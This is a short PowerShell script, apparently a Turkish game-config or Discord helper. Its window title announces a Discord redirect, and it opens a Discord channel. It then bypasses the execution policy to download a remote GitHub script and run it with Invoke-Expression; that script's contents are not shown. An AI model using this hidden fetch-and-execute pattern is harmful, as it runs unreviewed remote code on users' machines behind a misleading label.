$host.ui.RawUI.WindowTitle = "Discord Yönledirmei..."
Clear-Host

Start-Process "discord://https://discord.com/channels/148419527825162240/1118943418421362839"
Start-Sleep -Seconds 1
PowerShell.exe -ExecutionPolicy Bypass -Command "& { Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/main.ps1' | Invoke-Expression }"